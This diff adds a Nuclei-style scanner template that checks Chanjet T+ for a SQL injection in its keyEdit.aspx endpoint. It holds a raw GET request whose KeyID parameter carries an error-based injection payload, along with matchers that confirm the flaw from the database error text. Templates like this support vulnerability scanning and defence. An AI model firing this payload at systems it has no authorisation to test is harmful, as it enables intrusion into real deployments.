@@ -1,0 +1,30 @@
+id: poc-yaml-changjie-tplus-keyedit-aspx-sqli
+info:
+  name: 畅捷通T+ keyEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in the keyEdit.aspx endpoint of 畅捷通T+.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)))%20--&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "{{t2}}"
+          - "转换成数据类型 int 时失败"
